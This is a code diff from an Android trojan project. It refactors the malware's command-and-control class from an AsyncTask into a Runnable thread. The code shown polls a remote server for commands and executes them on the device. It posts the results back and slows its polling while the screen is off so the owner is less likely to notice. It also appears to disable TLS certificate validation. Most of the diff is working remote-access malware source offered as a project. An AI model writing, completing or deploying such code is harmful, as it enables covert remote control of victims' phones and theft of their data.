@@ -1,7 +1,6 @@
 package trojan.android.android_trojan.Action;
 
 import android.content.Context;
-import android.os.AsyncTask;
 import android.os.Looper;
 import android.util.Log;
 
@@ -27,8 +26,7 @@ import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 
 
-
-public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
+public class ConnectionServerThread implements Runnable {
     private static final String TAG = "ConnectionServerTask";
     private ActionService actionService;
     private String host;
@@ -43,8 +41,10 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
     private String SALT = "LOL";
     private String KEY = null;
     private String HASH = null;
+    private boolean cancel = false;
 
-    public ConnectionServerTask(Context context) {
+
+    public ConnectionServerThread(Context context){
         this.context = context;
         /*this.KEY = SALT + context.getResources().getString(R.string.KEY);
         this.host = context.getResources().getString(R.string.HOST);
@@ -57,13 +57,9 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
         this.timeon = 4000;
         this.timeoff = 54000;
         this.time = timeon;
-    }
 
-    @Override
-    protected void onPreExecute() {
-        super.onPreExecute();
         acceptAll();
-        Log.d(TAG, "onPreExecute");
+
         actionService = new ActionService(context);
         this.HASH = SHA1(this.KEY);
         try {
@@ -72,49 +68,44 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
         } catch (MalformedURLException e) {
             e.printStackTrace();
         }
-
     }
 
     @Override
-    protected Integer doInBackground(Integer... integer) {
+    public void run() {
+        Looper.prepare();
+        //Looper.loop();
         String result;
         long now;
-        Log.i(TAG, "doInBackground");
-        while (!isCancelled()){
-            now = System.currentTimeMillis();
+        Log.i(TAG, "run");
+             while (!isCancel()){
+              now = System.currentTimeMillis();
 
-            if (time != timeoff && !Tools.isScreenOn(context)){
-                time = timeoff;
-            }else if (time != timeon && Tools.isScreenOn(context)){
-                time = timeon;
+              if (time != timeoff && !Tools.isScreenOn(context)){
+                  time = timeoff;
+              }else if (time != timeon && Tools.isScreenOn(context)){
+                  time = timeon;
+              }
+
+              if (detla > time) {
+                   result = getHttp(urlaction);
+                   if (result != null && !result.equals("null")) {
+                       postHttp(urlresult, actionService.action(result), this.HASH);
+                       detla = 0;
+                   }
+              }
+              detla += now;
+              Tools.sleep(timeon/2);
             }
 
-            if (detla > time) {
-                result = getHttp(urlaction);
-                if (result != null && !result.equals("null")) {
-                    postHttp(urlresult, actionService.action(result), this.HASH);
-                    detla = 0;
-                }
-            }
-            detla += now;
-            Tools.sleep(timeon/2);
-        }
-
-        return 0;
     }
 
-    @Override
-    protected void onPostExecute(Integer integer) {
-        super.onPostExecute(integer);
-        Log.d(TAG, "onPostExecute");
+    public boolean isCancel(){
+        return this.cancel;
     }
 
-    @Override
-    protected void onCancelled(Integer integer) {
-        super.onCancelled(integer);
-        Log.d(TAG, "onCancelled");
+    public void cancel(){
+        this.cancel = true;
     }
-
     private String getHttp(URL url) {
         Log.d(TAG, "getHttp");
         String result = null;
